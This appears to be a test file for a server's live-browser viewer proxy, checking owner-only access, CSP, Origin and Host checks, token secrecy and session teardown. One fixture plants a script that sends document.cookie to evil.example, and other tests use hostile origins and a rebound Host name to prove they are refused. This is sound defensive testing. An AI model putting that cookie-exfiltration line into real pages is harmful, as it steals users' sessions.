// The owner watches a run's browser live (browser-live.ts): the run's process serves pi-browser's own viewer on
// a loopback port of its own and hands it over in one 0600 file in the run's directory; the server gives the viewer's
// link to the owner's signed-in page alone, and proxies its page and its WebSocket, from this server's own origin alone,
// under a CSP framed by 'self' on that route only. A frame goes from the browser to the viewer through the proxy; input
// before Take over never reaches the browser (browser-take-over.test.mjs has the rest); a second viewer is refused; the token is in no record, row, view, file list or log; and it
// dies with its session. On fakes: no network, no key.
import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { mkdir, readdir, stat } from "node:fs/promises";
import { join } from "node:path";
import { test } from "node:test";
import { FRAME } from "./fixtures/faux-browser.mjs";
import { connect } from "./fixtures/ws-client.mjs";
import { builtConsole, call, cookieOf, follow, runDir as runFolder, runRecordOf, scratch, serve, withEnv } from "./support.mjs";

const FAUX_BROWSER = new URL("./fixtures/faux-browser.mjs", import.meta.url).pathname;
const BROWSE_ASK = new URL("./fixtures/faux-browse-ask.mjs", import.meta.url).pathname;
const RECOVER = new URL("./fixtures/faux-browse-recover.mjs", import.meta.url).pathname;
const KEYS = ["BROWSERBASE_API_KEY", "BROWSERBASE_PROJECT_ID", "KERNEL_API_KEY", "FAUX_BROWSER_LOG"];
const json = { "content-type": "application/json" };
/** A test password, no real one. */
const PASSWORD = ["not-a-secret", "owner"].join("-");
const until = async (check, ms = 15_000) => { for (const end = Date.now() + ms; Date.now() < end; await new Promise((r) => setTimeout(r, 50))) if (await check()) return true; return false; };
/** Every file under `dir`, path and bytes. */
const filesUnder = (dir) => readdirSync(dir, { withFileTypes: true }).flatMap((entry) => {
  const path = join(dir, entry.name);
  return entry.isDirectory() ? filesUnder(path) : entry.isFile() ? [[path, readFileSync(path)]] : [];
});

/** A signed-in owner's server with the fake browser, and a run of `watch` (browse, then ask) waiting with its session open. */
async function watched(t, options = {}) {
  withEnv(t, { BROWSERBASE_API_KEY: "fake-test-key", BROWSERBASE_PROJECT_ID: "fake-project", FAUX_BROWSER_LOG: join(await scratch(t), "browser.jsonl") }, KEYS);
  const server = await serve(t, { accounts: true, openSetup: true, console: await builtConsole(t), fauxBrowser: FAUX_BROWSER, faux: BROWSE_ASK, ...options });
  const origin = `http://127.0.0.1:${server.port}`;
  const made = await call(server.port, { method: "POST", path: "/v2/setup", headers: { ...json, origin }, body: { password: PASSWORD } });
  assert.equal(made.status, 201, made.text);
  const cookie = cookieOf(made);
  assert.equal((await server.api("POST", "/agents", { definition: { id: "watch", name: "watch", instructions: "Browse, then ask.", tools: ["browser", "ask_person"] } })).status, 201);
  const started = await server.api("POST", "/agents/watch/runs", { input: { content: "Browse the example page." } });
  assert.equal(started.status, 202, JSON.stringify(started.body));
  const runId = started.body.run_id;
  const { after } = await follow(server.api, runId, ["input_required"]);
  const dir = join(runFolder(server.data, runId), "browser-live");
  assert.ok(await until(() => readdir(dir).then((names) => names.some((name) => name.endsWith(".json")), () => false)), "the run's process handed its viewer over");
  const file = join(dir, (await readdir(dir)).find((name) => name.endsWith(".json")));
  return { server, origin, cookie, runId, file, after };
}

const browserOf = (w, headers) => call(w.server.port, { path: `/v2/runs/${w.runId}/browser`, headers });
/** A WebSocket to `path`: from the server's own origin (null: none) with the owner's cookie (null: none), unless told. */
const liveWs = (w, path, { origin = w.origin, cookie = w.cookie, headers = {} } = {}) => connect(`ws://127.0.0.1:${w.server.port}${path}`, { origin: origin ?? undefined, headers: { ...(cookie ? { cookie } : {}), ...headers } });

test("the owner's signed-in page alone gets the viewer's link; the page is framed by 'self' on that route alone; a frame reaches the viewer through the proxy, its input before Take over never reaches the browser, and a second viewer is refused", { timeout: 120_000 }, async (t) => {
  const w = await watched(t);
  const handed = JSON.parse(readFileSync(w.file, "utf8"));
  assert.equal(statSync(w.file).mode & 0o777, 0o600, "the hand-over is the server's user's alone");
  assert.deepEqual(Object.keys(handed).sort(), ["at", "id", "port", "tag", "token"]);
  assert.equal(statSync(join(w.file, "..")).mode & 0o777, 0o700, "in a directory of the server's user's alone");
  assert.ok(!w.file.includes("/work/"), "outside the run's work/");

  // Owner-only: no credential 401, the server's token 403, the owner's session 200.
  assert.equal((await browserOf(w, {})).status, 401);
  assert.equal((await browserOf(w, { authorization: `Bearer ${w.server.token}` })).status, 403, "a token never opens the browser");
  const answer = await browserOf(w, { cookie: w.cookie });
  assert.equal(answer.status, 200, answer.text);
  assert.deepEqual(answer.json, { state: "live", viewer: `/v2/runs/${w.runId}/browser/live/v/${handed.id}#t=${handed.token}` });
  assert.equal(answer.headers["cache-control"], "no-store");

  // The viewer's page: the owner's session, under this route's own CSP; the console keeps frame-ancestors 'none'.
  const pagePath = `/v2/runs/${w.runId}/browser/live/v/${handed.id}`;
  assert.equal((await call(w.server.port, { path: pagePath })).status, 401);
  assert.equal((await call(w.server.port, { path: pagePath, headers: { authorization: `Bearer ${w.server.token}` } })).status, 403);
  const viewerPage = await call(w.server.port, { path: pagePath, headers: { cookie: w.cookie } });
  assert.equal(viewerPage.status, 200, viewerPage.text);
  assert.match(viewerPage.text, /<canvas id="screen"/);
  assert.match(viewerPage.headers["content-security-policy"], /frame-ancestors 'self'/);
  assert.match(viewerPage.headers["content-security-policy"], /connect-src 'self';/, "the viewer connects to this server alone");
  assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/browser/live/viewer.js`, headers: { cookie: w.cookie } })).status, 200);
  assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/browser/live/v/AAAAAAAAAAAAAAAAAAAAAA`, headers: { cookie: w.cookie } })).status, 404, "another viewer's path is not proxied");
  assert.match((await call(w.server.port, { path: "/", headers: { cookie: w.cookie } })).headers["content-security-policy"], /frame-ancestors 'none'/, "the console is never framed");

  // The WebSocket: this server's own origin and the owner's session, or nothing.
  const wsPath = `${pagePath}/ws`;
  assert.equal((await liveWs(w, wsPath, { origin: "http://evil.example" })).status, 403, "another origin");
  assert.equal((await liveWs(w, wsPath, { origin: null })).status, 403, "no origin");
  assert.equal((await liveWs(w, wsPath, { cookie: null })).status, 401, "no session");
  assert.equal((await liveWs(w, wsPath, { cookie: null, headers: { authorization: `Bearer ${w.server.token}` } })).status, 401, "a token is no session");
  assert.equal((await liveWs(w, `/v2/runs/${w.runId}/browser/live/v/AAAAAAAAAAAAAAAAAAAAAA/ws`)).status, 404);
  assert.equal((await liveWs(w, "/v2/runs/whatever")).status, 404, "no other upgrade is taken");
  const first = await liveWs(w, wsPath);
  assert.equal(first.status, 101);
  first.ws.sendJson({ type: "hello", token: handed.token });
  assert.deepEqual(JSON.parse((await first.ws.next(5_000)).data), { type: "ready", drive: "idle", takeOver: true, held: false });
  const { item: frame } = await first.ws.until((m) => m.type === "binary", 10_000);
  assert.ok(frame, "a screencast frame arrived through the proxy");
  assert.deepEqual([frame.data.readUInt16BE(0), frame.data.readUInt16BE(2)], [FRAME.w, FRAME.h]);
  assert.deepEqual(frame.data.subarray(4), FRAME.bytes, "the browser's frame, byte for byte");
  first.ws.sendJson({ type: "text", text: "typed before taking over" });
  const { item: held } = await first.ws.until((m) => m.type === "text" && JSON.parse(m.data).type === "held", 5_000);
  assert.deepEqual(JSON.parse(held.data), { type: "held", reason: "not_taken" }, "input is dropped by the run, never sent");
  const second = await liveWs(w, wsPath);
  assert.equal(second.status, 101);
  second.ws.sendJson({ type: "hello", token: handed.token });
  assert.deepEqual(JSON.parse((await second.ws.next(5_000)).data), { type: "refused", reason: "viewer_in_use" });
  first.ws.destroy();
});

test("the viewer's token and its file are in no record, row, view, file list, home or log; it dies with the session: the route says none and the old link is refused", { timeout: 120_000 }, async (t) => {
  const w = await watched(t);
  const handed = JSON.parse(readFileSync(w.file, "utf8"));
  const runDir = runFolder(w.server.data, w.runId);
  const said = [];
  for (const path of [`/runs/${w.runId}`, `/runs/${w.runId}/timeline`, "/runs", `/agents/watch/runs`, `/runs/${w.runId}/files`, "/agents/watch/home/files", "/capabilities", "/stats"]) {
    const res = await w.server.api("GET", path);
    said.push(path);
    assert.ok(!JSON.stringify(res.body).includes(handed.token) && !JSON.stringify(res.body).includes(handed.id), `${path} holds no token and no viewer id`);
  }
  for (const path of [`/runs/${w.runId}/files/..%2Fbrowser-live/${handed.tag}.json`, `/runs/${w.runId}/files/../browser-live/${handed.tag}.json`, `/runs/${w.runId}/files/browser-live/${handed.tag}.json`]) {
    const res = await w.server.api("GET", path);
    assert.ok(res.status >= 400 && !JSON.stringify(res.body).includes(handed.token), `${path}: ${res.status}`);
  }
  // Every file the server and the run keep, the run's store and its process log among them: the token is in the hand-over alone.
  const holding = filesUnder(w.server.data).filter(([path, bytes]) => bytes.includes(handed.token)).map(([path]) => path);
  assert.deepEqual(holding, [w.file]);
  assert.equal((await w.server.api("POST", `/runs/${w.runId}/archive`)).status, 200);
  assert.ok(!JSON.stringify((await w.server.api("GET", `/runs/${w.runId}`)).body).includes(handed.token), "archived, the same");
  assert.equal((await w.server.api("POST", `/runs/${w.runId}/unarchive`)).status, 200);

  // The viewer open as the session ends: it is told, and the token dies with it.
  const wsPath = `/v2/runs/${w.runId}/browser/live/v/${handed.id}/ws`;
  const open = await liveWs(w, wsPath);
  open.ws.sendJson({ type: "hello", token: handed.token });
  assert.equal(JSON.parse((await open.ws.next(5_000)).data).type, "ready");
  assert.equal((await w.server.api("POST", `/runs/${w.runId}/messages`, { content: "Yes, that is all." })).status, 202);
  await follow(w.server.api, w.runId, ["completed"], { after: w.after });
  const { item: ended } = await open.ws.until((m) => m.type === "close" || (m.type === "text" && JSON.parse(m.data).type === "ended"), 15_000);
  assert.ok(ended, "the open viewer was ended");
  assert.ok(await until(() => stat(w.file).then(() => false, () => true)), "the hand-over went with the session");
  assert.deepEqual((await browserOf(w, { cookie: w.cookie })).json, { state: "none" });
  assert.equal((await liveWs(w, wsPath)).status, 404, "the old link opens nothing");
  assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/browser/live/v/${handed.id}`, headers: { cookie: w.cookie } })).status, 404);
  assert.ok(!filesUnder(runDir).some(([, bytes]) => bytes.includes(handed.token)), "and nothing of the run's holds the token");
});

test("the route says whether a run has a browser at all: off with why when its agent has none or its browser resolves unavailable, none when it has one with no session open", { timeout: 120_000 }, async (t) => {
  withEnv(t, { BROWSERBASE_API_KEY: "fake-test-key", BROWSERBASE_PROJECT_ID: "fake-project", FAUX_BROWSER_LOG: join(await scratch(t), "browser.jsonl") }, KEYS);
  const first = await serve(t, { accounts: true, openSetup: true, console: await builtConsole(t), fauxBrowser: FAUX_BROWSER });
  const own = (server) => ({ ...json, origin: `http://127.0.0.1:${server.port}` });
  const made = await call(first.port, { method: "POST", path: "/v2/setup", headers: own(first), body: { password: PASSWORD } });
  assert.equal(made.status, 201, made.text);
  const browserOfRun = (server, cookie, runId) => call(server.port, { path: `/v2/runs/${runId}/browser`, headers: { cookie } });
  const ran = async (id, tools, content) => {
    assert.equal((await first.api("POST", "/agents", { definition: { id, name: id, instructions: "Answer.", tools } })).status, 201);
    const started = await first.api("POST", `/agents/${id}/runs`, { input: { content } });
    assert.equal(started.status, 202, JSON.stringify(started.body));
    await follow(first.api, started.body.run_id, ["completed"]);
    return started.body.run_id;
  };
  const plain = await ran("plain", ["read"], "hi");
  const browsed = await ran("browse", ["browser"], "Browse the example page.");
  assert.deepEqual((await browserOfRun(first, cookieOf(made), plain)).json, { state: "off", reason: "this run's agent has no browser tool" });
  assert.deepEqual((await browserOfRun(first, cookieOf(made), browsed)).json, { state: "none" }, "a browser, its session released with the run");
  await first.close();
  // Its browser resolving unavailable at the next start (its vendor's key gone): off, in the plane's words.
  const file = join(runFolder(first.data, browsed), "serve.json");
  const meta = JSON.parse(readFileSync(file, "utf8"));
  writeFileSync(file, JSON.stringify({ ...meta, tool_plane: { ...meta.tool_plane, browser: "kernel" } }));
  const again = await serve(t, { data: first.data, accounts: true, fauxBrowser: FAUX_BROWSER });
  const signed = await call(again.port, { method: "POST", path: "/v2/auth/sign-in", headers: own(again), body: { password: PASSWORD } });
  assert.equal(signed.status, 200, signed.text);
  assert.deepEqual((await browserOfRun(again, cookieOf(signed), browsed)).json, { state: "off", reason: "kernel is picked, and it needs a Kernel key: save one in Settings → Tool keys (or set KERNEL_API_KEY where the server starts)" });
});

test("a run whose browser key is deleted while it runs keeps its live viewer: its process holds the key it started with, so the link is still served while the process lives, and off once it ends", { timeout: 180_000 }, async (t) => {
  const { randomBytes } = await import("node:crypto");
  // No key in the environment: the browser's key is the saved one alone.
  withEnv(t, { AGENTRUN_SEAL_KEY: randomBytes(32).toString("base64"), FAUX_BROWSER_LOG: join(await scratch(t), "browser.jsonl") }, [...KEYS, "AGENTRUN_SEAL_KEY"]);
  const server = await serve(t, { accounts: true, openSetup: true, console: await builtConsole(t), fauxBrowser: FAUX_BROWSER, faux: BROWSE_ASK });
  const origin = `http://127.0.0.1:${server.port}`;
  const made = await call(server.port, { method: "POST", path: "/v2/setup", headers: { ...json, origin }, body: { password: PASSWORD } });
  assert.equal(made.status, 201, made.text);
  const cookie = cookieOf(made);
  assert.equal((await server.api("PUT", "/settings/tool-keys/browserbase", { values: { BROWSERBASE_API_KEY: "fake-test-key", BROWSERBASE_PROJECT_ID: "fake-project" } })).status, 204);
  assert.equal((await server.api("POST", "/agents", { definition: { id: "keyed", name: "keyed", instructions: "Browse, then ask.", tools: ["browser", "ask_person"] } })).status, 201);
  const started = await server.api("POST", "/agents/keyed/runs", { input: { content: "Browse the example page." } });
  assert.equal(started.status, 202, JSON.stringify(started.body));
  const runId = started.body.run_id;
  const { after } = await follow(server.api, runId, ["input_required"]);
  const browserNow = async () => (await call(server.port, { path: `/v2/runs/${runId}/browser`, headers: { cookie } })).json;
  assert.ok(await until(async () => (await browserNow())?.state === "live"), "live while the run's process holds its session");
  assert.equal((await server.api("DELETE", "/settings/tool-keys/browserbase")).status, 204);
  const kept = await browserNow();
  assert.equal(kept.state, "live", `the key deleted, the running viewer is still served: ${JSON.stringify(kept)}`);
  assert.equal((await server.api("POST", `/runs/${runId}/messages`, { content: "Yes, that is all." })).status, 202);
  await follow(server.api, runId, ["completed"], { after });
  const ended = await browserNow();
  assert.equal(ended.state, "off", "its process gone, with no key here: off");
  assert.match(ended.reason, /BROWSERBASE_API_KEY/);
});

test("a malformed run id under the live path is a 404, never a crash: the server answers the next request, for HTTP and for the upgrade", { timeout: 60_000 }, async (t) => {
  const { port } = await serve(t);
  for (const path of ["/v2/runs/%E0%A4%A/browser/live/viewer.js", "/v2/runs/%/browser/live/v/AAAAAAAAAAAAAAAAAAAAAA"]) {
    assert.equal((await call(port, { path })).status, 404, path);
    assert.equal((await call(port, { path: "/v2/health" })).status < 500, true, `the server still answers after ${path}`);
  }
  const upgrade = await connect(`ws://127.0.0.1:${port}/v2/runs/%E0%A4%A/browser/live/v/AAAAAAAAAAAAAAAAAAAAAA/ws`, { origin: `http://127.0.0.1:${port}` });
  assert.equal(upgrade.status, 404);
  assert.equal((await call(port, { path: "/v2/health" })).status < 500, true, "and after the upgrade");
});

test("a run's process that dies without letting its sessions go takes its hand-over with it, and a hand-over with no live process names no viewer: none, and nothing is proxied", { timeout: 120_000 }, async (t) => {
  const w = await watched(t);
  const handed = JSON.parse(readFileSync(w.file, "utf8"));
  const { holder } = runRecordOf(w.server.data, w.runId);
  process.kill(holder.pid, "SIGKILL");
  assert.ok(await until(() => stat(w.file).then(() => false, () => true)), "the hand-over went with the process");
  assert.deepEqual((await browserOf(w, { cookie: w.cookie })).json, { state: "none" });
  // One left behind (a server that was not watching when the process died), on a port another listener now answers: none.
  const { createServer } = await import("node:http");
  const squatter = createServer((_req, res) => { res.writeHead(200, { "content-type": "text/html" }); res.end("<script src=/x.js></script>"); });
  await new Promise((resolve) => squatter.listen(0, "127.0.0.1", resolve));
  t.after(() => new Promise((resolve) => squatter.close(resolve)));
  await mkdir(join(w.file, ".."), { mode: 0o700 });
  writeFileSync(w.file, JSON.stringify({ ...handed, port: squatter.address().port }), { mode: 0o600 });
  assert.deepEqual((await browserOf(w, { cookie: w.cookie })).json, { state: "none" }, "no live process: no viewer");
  assert.equal((await call(w.server.port, { path: `/v2/runs/${w.runId}/browser/live/v/${handed.id}`, headers: { cookie: w.cookie } })).status, 404, "nothing proxied");
  assert.equal((await liveWs(w, `/v2/runs/${w.runId}/browser/live/v/${handed.id}/ws`)).status, 404);
});

test("a run's process that restarts with its browser session kept hands that session's viewer over again: the owner reads live, its viewer answers with a frame through the proxy, and nobody holds the browser", { timeout: 180_000 }, async (t) => {
  withEnv(t, { FAUX_BROWSER_STATE: join(await scratch(t), "vendor-sessions.json") }, ["FAUX_BROWSER_STATE"]);
  const w = await watched(t, { faux: RECOVER });
  const before = JSON.parse(readFileSync(w.file, "utf8"));
  const { holder } = runRecordOf(w.server.data, w.runId);
  process.kill(holder.pid, "SIGKILL");
  assert.ok(await until(() => stat(w.file).then(() => false, () => true)), "the hand-over went with the process");
  // The next message starts a new process for the run, which finds its session still running at the vendor and keeps it;
  // that turn makes no browser call.
  assert.equal((await w.server.api("POST", `/runs/${w.runId}/messages`, { content: "Go on." })).status, 202);
  await follow(w.server.api, w.runId, ["input_required"], { after: w.after });
  assert.ok(await until(async () => (await browserOf(w, { cookie: w.cookie })).json?.state === "live", 20_000), "the kept session's viewer is handed over again");
  const live = (await browserOf(w, { cookie: w.cookie })).json;
  const [, id, token] = /\/v\/([A-Za-z0-9_-]{22})#t=([A-Za-z0-9_-]{43})$/.exec(live.viewer) ?? [];
  assert.ok(id && token);
  assert.notEqual(token, before.token, "the new process's own viewer: the old token died with the old process");
  const viewer = await liveWs(w, `/v2/runs/${w.runId}/browser/live/v/${id}/ws`);
  assert.equal(viewer.status, 101);
  viewer.ws.sendJson({ type: "hello", token });
  assert.deepEqual(JSON.parse((await viewer.ws.next(5_000)).data), { type: "ready", drive: "idle", takeOver: true, held: false }, "it starts with no hold");
  const { item: frame } = await viewer.ws.until((m) => m.type === "binary", 10_000);
  assert.ok(frame, "a frame through the proxy");
  assert.deepEqual(frame.data.subarray(4), FRAME.bytes);
  viewer.ws.destroy();
});

test("the viewer's code is always this server's own: a run's port that answers the viewer's page and files with a planted script is never served from, and only the viewer's socket reaches it", { timeout: 120_000 }, async (t) => {
  const w = await watched(t);
  const handed = JSON.parse(readFileSync(w.file, "utf8"));
  const { viewerAssets } = await import("@parcha/pi-browser/live-view");
  const { createServer } = await import("node:http");
  const { createHash } = await import("node:crypto");
  // A port that answers every page and file with a script of its own, and takes the socket.
  const asked = [];
  const upgraded = [];
  const sockets = new Set();
  const planted = createServer((req, res) => { asked.push(req.url); res.writeHead(200, { "content-type": "text/javascript" }); res.end("fetch('https://evil.example/?' + document.cookie)"); });
  planted.on("upgrade", (req, socket) => {
    upgraded.push(req.url);
    sockets.add(socket);
    socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${createHash("sha1").update(`${req.headers["sec-websocket-key"]}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64")}\r\n\r\n`);
    socket.on("error", () => {});
  });
  await new Promise((resolve) => planted.listen(0, "127.0.0.1", resolve));
  // An upgraded socket is no longer the server's to close: it is ended here.
  t.after(() => new Promise((resolve) => { for (const socket of sockets) socket.destroy(); planted.close(resolve); planted.closeAllConnections(); }));
  writeFileSync(w.file, JSON.stringify({ ...handed, port: planted.address().port }), { mode: 0o600 });
  const base = `/v2/runs/${w.runId}/browser/live`;
  for (const [rest, bytes, type] of [[`/v/${handed.id}`, viewerAssets.html, /^text\/html/], ["/viewer.js", viewerAssets.js, /^text\/javascript/], ["/viewer.css", viewerAssets.css, /^text\/css/]]) {
    const got = await call(w.server.port, { path: `${base}${rest}`, headers: { cookie: w.cookie } });
    assert.equal(got.status, 200, rest);
    assert.equal(got.text, bytes, `${rest}: this server's own pi-browser viewer, byte for byte`);
    assert.match(got.headers["content-type"], type);
    assert.match(got.headers["content-security-policy"], /script-src 'self'; .*connect-src 'self';.*frame-ancestors 'self'/);
  }
  assert.deepEqual(asked, [], "no page or file was asked of the run's port");
  const socket = await liveWs(w, `${base}/v/${handed.id}/ws`);
  assert.equal(socket.status, 101);
  assert.deepEqual(upgraded, [`/v/${handed.id}/ws`], "the socket alone reached it");
  socket.ws.destroy();
});

test("the viewer's WebSocket gets the Host check every route gets (host-check.ts): a page that rebound a name of its own to this address is refused, whatever its Origin and cookie; this machine's names on any port (a tunnel) and an --allow-host name are taken", { timeout: 120_000 }, async (t) => {
  const w = await watched(t, { allowHosts: ["agents.internal"] });
  const handed = JSON.parse(readFileSync(w.file, "utf8"));
  const wsPath = `/v2/runs/${w.runId}/browser/live/v/${handed.id}/ws`;
  const at = (name) => ({ origin: `http://${name}`, headers: { host: name } });
  // A rebinding page: its Origin is its own name, which this server's Origin check would take; its Host is what gives it away.
  assert.equal((await liveWs(w, wsPath, at(`rebound.example:${w.server.port}`))).status, 403, "a rebound name");
  assert.equal((await liveWs(w, "/v2/runs/whatever", at(`rebound.example:${w.server.port}`))).status, 403, "refused before anything else about it");
  for (const name of [`localhost:${w.server.port + 1}`, `127.0.0.1:${w.server.port}`, `agents.internal:${w.server.port}`]) {
    const taken = await liveWs(w, wsPath, at(name));
    assert.equal(taken.status, 101, name);
    taken.ws.sendJson({ type: "hello", token: handed.token });
    assert.equal(JSON.parse((await taken.ws.next(5_000)).data).type, "ready", name);
    taken.ws.destroy();
    // One viewer at a time: the next waits for this one's socket to close.
    await new Promise((resolve) => setTimeout(resolve, 300));
  }
});

test("behind a TLS proxy that rewrites Host or drops X-Forwarded-Proto, the owner's WebSocket from the server's public address is taken; another origin still is not", { timeout: 120_000 }, async (t) => {
  const w = await watched(t, { publicUrl: "https://agent.example.com" });
  const handed = JSON.parse(readFileSync(w.file, "utf8"));
  const wsPath = `/v2/runs/${w.runId}/browser/live/v/${handed.id}/ws`;
  assert.equal((await liveWs(w, wsPath, { origin: "https://evil.example.com" })).status, 403);
  const owned = await liveWs(w, wsPath, { origin: "https://agent.example.com" });
  assert.equal(owned.status, 101, "the public address's origin");
  owned.ws.sendJson({ type: "hello", token: handed.token });
  assert.equal(JSON.parse((await owned.ws.next(5_000)).data).type, "ready");
  owned.ws.destroy();
});

/** A viewer open through the proxy with the owner's cookie `cookie`: its first frame read, so bytes flow both ways. */
async function watching(w, handed, cookie = w.cookie) {
  const open = await liveWs(w, `/v2/runs/${w.runId}/browser/live/v/${handed.id}/ws`, { cookie });
  assert.equal(open.status, 101);
  open.ws.sendJson({ type: "hello", token: handed.token });
  assert.equal(JSON.parse((await open.ws.next(5_000)).data).type, "ready");
  assert.ok((await open.ws.until((m) => m.type === "binary", 10_000)).item, "a frame came through");
  return open.ws;
}
/** The socket closes within `ms`, and nothing comes after. */
async function closesWithin(ws, ms, what) {
  const { item } = await ws.until((m) => m.type === "close", ms);
  assert.equal(item?.type, "close", what);
  assert.equal((await ws.next(300)).type, "none", "nothing comes after the close");
}
/** A new viewer is taken once the old one's way to the run is gone too: the run's viewer takes one at a time. */
async function takenAgain(w, handed, cookie) {
  const fresh = await watching(w, handed, cookie);
  fresh.destroy();
}

test("a viewer already watching is cut off when the owner signs out everywhere: its socket and its way to the run close at once", { timeout: 120_000 }, async (t) => {
  const w = await watched(t);
  const handed = JSON.parse(readFileSync(w.file, "utf8"));
  const ws = await watching(w, handed);
  const out = await call(w.server.port, { method: "POST", path: "/v2/auth/sign-out-everywhere", headers: { ...json, origin: w.origin, cookie: w.cookie }, body: {} });
  assert.equal(out.status, 200, out.text);
  await closesWithin(ws, 2_000, "the viewer's socket closes at sign-out everywhere");
  const signed = await call(w.server.port, { method: "POST", path: "/v2/auth/sign-in", headers: { ...json, origin: w.origin }, body: { password: PASSWORD } });
  await takenAgain(w, handed, cookieOf(signed));
});

test("a viewer already watching is cut off within the re-check when another process resets the password", { timeout: 120_000 }, async (t) => {
  const w = await watched(t);
  const handed = JSON.parse(readFileSync(w.file, "utf8"));
  const ws = await watching(w, handed);
  // As `agentrun-serve reset-password` does from its own process: owner.json rewritten, nothing said to this server.
  const { resetPassword } = await import("../dist/owner.js");
  resetPassword(w.server.data);
  // The re-check's period (LIVE_RECHECK_MS, 2 s) and a margin.
  await closesWithin(ws, 4_000, "the viewer's socket closes after a reset in another process");
  const made = await call(w.server.port, { method: "POST", path: "/v2/setup", headers: { ...json, origin: w.origin }, body: { password: PASSWORD } });
  await takenAgain(w, handed, cookieOf(made));
});

test("a run's port that resets the connection after the viewer's WebSocket opened: the viewer's socket closes with no HTTP line written into the WebSocket stream", async (t) => {
  const net = await import("node:net");
  const http = await import("node:http");
  const { proxyLiveUpgrade } = await import("../dist/browser-live.js");
  // The run's port: it takes the upgrade (101), then cuts the connection with a reset, as a crashed process would.
  const run = net.createServer((sock) => {
    sock.once("data", () => {
      sock.write("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: x\r\n\r\n");
      setTimeout(() => sock.resetAndDestroy(), 100);
    });
  });
  await new Promise((resolve) => run.listen(0, "127.0.0.1", resolve));
  // The server's side: its upgrade handed to proxyLiveUpgrade, as server.ts does.
  const server = http.createServer();
  server.on("upgrade", (req, socket, head) => proxyLiveUpgrade(req, socket, head, { port: run.address().port }, "/v/AbCdEfGhIjKlMnOpQrStUv/ws"));
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  t.after(() => { run.close(); server.close(); });
  const client = net.connect(server.address().port, "127.0.0.1");
  let got = Buffer.alloc(0);
  client.on("data", (chunk) => { got = Buffer.concat([got, chunk]); });
  client.on("error", () => {});
  await new Promise((resolve) => client.once("connect", resolve));
  client.write("GET /v2/runs/x/browser/live/v/AbCdEfGhIjKlMnOpQrStUv/ws HTTP/1.1\r\nHost: 127.0.0.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n");
  await new Promise((resolve) => { client.once("close", resolve); setTimeout(resolve, 3000); });
  const text = got.toString("latin1");
  assert.match(text, /^HTTP\/1\.1 101 /, "the upgrade went through");
  const after = text.slice(text.indexOf("\r\n\r\n") + 4);
  assert.equal(after, "", `nothing after the 101: the WebSocket stream is never sent an HTTP line (${JSON.stringify(after)})`);
  assert.equal(client.destroyed || client.readyState === "closed", true, "the viewer's socket closed");
});
